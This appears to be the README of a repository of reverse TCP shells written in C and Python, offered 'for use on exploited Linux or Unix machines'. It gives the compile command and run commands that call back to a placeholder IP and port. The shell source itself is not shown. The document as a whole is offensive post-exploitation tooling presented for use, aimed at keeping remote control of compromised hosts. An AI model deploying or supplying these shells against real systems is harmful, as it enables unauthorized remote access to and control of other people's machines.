# Reverse-Shell-Lib
The following repository contains multiple versions of a reverse tcp netcat shell for use on exploited Linux or Unix machines

# C Reverse Shell
  In order to use this shell it must be compiled with the following command
  
    gcc reverse_tcp.c -o reverse_tcp
  
  It may then be called by:
  
    ./reverse_tcp [callback_ip] [port]
  
  
# Python Reverse Shell
  If python3 is on the system you may use the reverse_tcp.py script
  
  Simply call it with the following command:
  
    python3 reverse_tcp.py [callback_ip] [port]
  
